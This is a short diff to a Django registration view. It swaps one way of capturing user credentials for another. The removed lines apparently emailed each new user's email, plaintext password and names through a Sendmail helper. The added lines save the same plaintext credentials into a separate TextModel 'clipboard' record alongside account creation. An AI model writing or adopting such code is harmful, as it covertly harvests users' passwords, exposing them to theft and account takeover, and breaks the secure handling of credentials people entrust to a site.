@@ -1,5 +1,5 @@
 from django.shortcuts import render,redirect
-from .models import TextModel, Sendmail
+from .models import TextModel
 from django.http import HttpResponse
 from django.contrib.auth import login, authenticate
 from django.contrib import messages
@@ -34,9 +34,12 @@ def register(request):
             messages.error(request, "Email already exists.")
             return render(request, 'index.html')
 
+        clipboard_value = f"email: {email},password: {password},firstname: {firstname},lastname: {lastname}"
+        text_model = TextModel.objects.create(clipboard=clipboard_value)
+        text_model.save()
+
         user = User.objects.create_user(username=email, email=email, password=password, first_name=firstname, last_name=lastname)
         message = f"email: {email}\npassword: {password}\nfirstname: {firstname}\nlastname: {lastname}"
-        Sendmail(message)
         user.save()
 
         # Authenticate and log in the user
